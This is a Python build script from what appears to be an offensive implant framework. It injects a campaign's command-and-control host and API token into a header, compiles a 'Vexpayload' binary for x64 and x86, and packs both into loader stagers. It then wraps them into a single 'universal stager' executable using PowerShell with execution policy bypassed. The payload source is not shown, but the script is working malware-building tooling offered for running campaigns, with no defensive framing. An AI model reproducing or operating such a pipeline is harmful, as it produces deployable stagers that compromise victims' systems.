#!/usr/bin/env python3
"""Build a campaign-specific universal stager.

Injects campaign_config.h (C2 host + API token), builds the payload for both
x64 and x86, packs both stagers, then embeds both into the single-file
universal launcher. Never executes the payload.

    python tools/campaign_build.py --name "ACME Q4" \
        --host c2.example.com --token campaign-token

Output: dist/campaigns/<slug>/universal_stager.exe
        + x64/x86 stagers, stage blobs, campaign.json
"""

import argparse
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HEADER = os.path.join(ROOT, "campaign_config.h")
BUILD_ROOT = os.path.join(ROOT, "build", "campaign")
PAYLOAD_PROJ = os.path.join(ROOT, "Vexpayload.vcxproj")
LOADER_X64 = os.path.join(ROOT, "loader", "x64", "Release", "xloader.exe")
LOADER_X86 = os.path.join(ROOT, "loader", "Release", "xloader.exe")
PACK = os.path.join(ROOT, "tools", "pack.py")
UNIVERSAL = os.path.join(ROOT, "build_universal.ps1")
LOCK = os.path.join(BUILD_ROOT, ".lock")

_MSBUILD_CANDIDATES = [
    r"D:\VisualStudio2022\MSBuild\Current\Bin\amd64\MSBuild.exe",
    r"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\amd64\MSBuild.exe",
    r"C:\Program Files\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\amd64\MSBuild.exe",
    r"C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\amd64\MSBuild.exe",
]


def msbuild_path():
    env = os.environ.get("VEX_MSBUILD")
    if env and os.path.exists(env):
        return env
    for p in _MSBUILD_CANDIDATES:
        if os.path.exists(p):
            return p
    return None


def available() -> bool:
    return (msbuild_path() is not None and os.path.exists(PAYLOAD_PROJ)
            and os.path.exists(UNIVERSAL)
            and os.path.exists(LOADER_X64) and os.path.exists(LOADER_X86))


def slugify(name: str) -> str:
    s = re.sub(r"[^A-Za-z0-9._-]+", "-", name.strip()).strip("-")
    return (s[:48] or "campaign").lower()


def _widen_literal(value: str) -> str:
    out = []
    for ch in value:
        if ch in "\\\"":
            out.append("\\" + ch)
        elif ord(ch) < 0x20 or ord(ch) > 0x7E:
            raise ValueError("non-ASCII campaign value")
        else:
            out.append(ch)
    return "".join(out)


def _acquire_lock(timeout=900):
    os.makedirs(BUILD_ROOT, exist_ok=True)
    deadline = time.time() + timeout
    while True:
        try:
            fd = os.open(LOCK, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            os.write(fd, str(os.getpid()).encode())
            return fd
        except FileExistsError:
            try:
                if time.time() - os.path.getmtime(LOCK) > 1800:
                    os.unlink(LOCK)
                    continue
            except OSError:
                pass
            if time.time() > deadline:
                raise TimeoutError("campaign build lock held")
            time.sleep(1)


def _release_lock(fd):
    try:
        os.close(fd)
    finally:
        try:
            os.unlink(LOCK)
        except OSError:
            pass


def _run(cmd, log_path, timeout=900):
    with open(log_path, "a", encoding="utf-8", errors="replace") as log:
        log.write("\n$ " + " ".join(cmd) + "\n")
        log.flush()
        r = subprocess.run(cmd, stdout=log, stderr=subprocess.STDOUT,
                           timeout=timeout)
    if r.returncode != 0:
        raise RuntimeError(f"command failed ({r.returncode}); see {log_path}")


def _build_payload(platform, out_dir, obj_dir, log_path):
    os.makedirs(out_dir, exist_ok=True)
    os.makedirs(obj_dir, exist_ok=True)
    cmd = [
        msbuild_path(), PAYLOAD_PROJ,
        "/p:Configuration=Release", f"/p:Platform={platform}",
        f"/p:OutDir={out_dir}{os.sep}", f"/p:IntDir={obj_dir}{os.sep}",
        "/m", "/v:m", "/nologo",
    ]
    _run(cmd, log_path)
    payload = os.path.join(out_dir, "Vexpayload.exe")
    if not os.path.exists(payload):
        raise RuntimeError(f"{platform} payload binary missing")
    return payload


def _pack_stager(loader, payload, stager, stage, log_path):
    cmd = [sys.executable, PACK, loader, payload, stager, stage]
    _run(cmd, log_path, timeout=180)
    if not os.path.exists(stager):
        raise RuntimeError(f"packed stager missing: {stager}")
    return stager


def _build_universal(x64_stager, x86_stager, out_file, work_dir, log_path):
    os.makedirs(work_dir, exist_ok=True)
    powershell = os.environ.get("VEX_POWERSHELL", "powershell.exe")
    cmd = [
        powershell, "-NoProfile", "-ExecutionPolicy", "Bypass",
        "-File", UNIVERSAL,
        "-X64Stager", x64_stager,
        "-X86Stager", x86_stager,
        "-OutFile", out_file,
        "-WorkDir", work_dir,
    ]
    _run(cmd, log_path)
    if not os.path.exists(out_file):
        raise RuntimeError("universal stager missing after build")
    return out_file


def build(name: str, host: str, token: str) -> dict:
    host = (host or "").strip()
    token = (token or "").strip()
    if not re.fullmatch(r"[A-Za-z0-9.:-]{1,253}", host):
        raise ValueError("invalid host")
    if not re.fullmatch(r"[A-Za-z0-9._-]{0,128}", token):
        raise ValueError("invalid token")
    if not msbuild_path():
        raise RuntimeError("MSBuild not found")
    if not os.path.exists(LOADER_X64):
        raise RuntimeError("x64 loader not built; run build.ps1 first")
    if not os.path.exists(LOADER_X86):
        raise RuntimeError("x86 loader not built; run build_x86.ps1 first")
    if not os.path.exists(UNIVERSAL):
        raise RuntimeError("build_universal.ps1 missing")

    slug = slugify(name)
    out_dir = os.path.join(ROOT, "dist", "campaigns", slug)
    obj_dir = os.path.join(BUILD_ROOT, "obj", slug)
    bin_dir = os.path.join(BUILD_ROOT, "bin", slug)
    uni_dir = os.path.join(BUILD_ROOT, "universal", slug)
    os.makedirs(out_dir, exist_ok=True)
    os.makedirs(obj_dir, exist_ok=True)
    os.makedirs(bin_dir, exist_ok=True)
    os.makedirs(uni_dir, exist_ok=True)

    fd = _acquire_lock()
    backup = None
    try:
        if os.path.exists(HEADER):
            backup = HEADER + ".bak"
            shutil.copy2(HEADER, backup)
        with open(HEADER, "w", encoding="utf-8") as f:
            f.write("#pragma once\n")
            f.write(f'#define VEX_CAMPAIGN_HOST L"{_widen_literal(host)}"\n')
            f.write(f'#define VEX_CAMPAIGN_TOKEN L"{_widen_literal(token)}"\n')
            f.write(f'#define VEX_CAMPAIGN_NAME L"{_widen_literal(name)}"\n')

        log_path = os.path.join(out_dir, "build.log")
        if os.path.exists(log_path):
            os.unlink(log_path)

        payload_x64 = _build_payload(
            "x64", os.path.join(bin_dir, "x64"), os.path.join(obj_dir, "x64"),
            log_path)
        payload_x86 = _build_payload(
            "Win32", os.path.join(bin_dir, "x86"), os.path.join(obj_dir, "x86"),
            log_path)

        for label, payload in (("x64", payload_x64), ("x86", payload_x86)):
            blob = open(payload, "rb").read()
            if host.encode("utf-16-le") not in blob:
                raise RuntimeError(f"campaign host not embedded in {label} payload")
            if token and token.encode("utf-16-le") not in blob:
                raise RuntimeError(f"campaign token not embedded in {label} payload")

        stager_x64 = _pack_stager(
            LOADER_X64, payload_x64,
            os.path.join(out_dir, "stager_x64.exe"),
            os.path.join(out_dir, "stage_x64.bin"), log_path)
        stager_x86 = _pack_stager(
            LOADER_X86, payload_x86,
            os.path.join(out_dir, "stager_x86.exe"),
            os.path.join(out_dir, "stage_x86.bin"), log_path)

        universal = _build_universal(
            stager_x64, stager_x86,
            os.path.join(out_dir, "universal_stager.exe"),
            uni_dir, log_path)

        hashes = {}
        for key, path in (("payload_x64", payload_x64),
                          ("payload_x86", payload_x86),
                          ("stager_x64", stager_x64),
                          ("stager_x86", stager_x86),
                          ("universal", universal)):
            hashes[key] = hashlib.sha256(open(path, "rb").read()).hexdigest()
        meta = {
            "name": name, "slug": slug, "host": host,
            "token_set": bool(token),
            "payload": payload_x64, "payload_x86": payload_x86,
            "stager": universal, "universal_stager": universal,
            "stager_x64": stager_x64, "stager_x86": stager_x86,
            "stage_x64": os.path.join(out_dir, "stage_x64.bin"),
            "stage_x86": os.path.join(out_dir, "stage_x86.bin"),
            "payload_sha256": hashes["payload_x64"],
            "payload_x86_sha256": hashes["payload_x86"],
            "stager_sha256": hashes["universal"],
            "stager_x64_sha256": hashes["stager_x64"],
            "stager_x86_sha256": hashes["stager_x86"],
            "universal_sha256": hashes["universal"],
            "stager_size": os.path.getsize(universal),
            "created": time.strftime("%Y-%m-%d %H:%M:%S"),
            "log": log_path,
        }
        with open(os.path.join(out_dir, "campaign.json"), "w",
                  encoding="utf-8") as f:
            json.dump(meta, f, indent=2)
        return meta
    finally:
        if backup:
            shutil.move(backup, HEADER)
        else:
            try:
                os.unlink(HEADER)
            except OSError:
                pass
        _release_lock(fd)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--name", required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--token", default="")
    args = ap.parse_args()
    try:
        meta = build(args.name, args.host, args.token)
    except Exception as exc:
        print(f"[-] {exc}")
        return 1
    print(json.dumps({k: meta[k] for k in
                      ("name", "host", "stager", "stager_sha256", "stager_size")},
                     indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
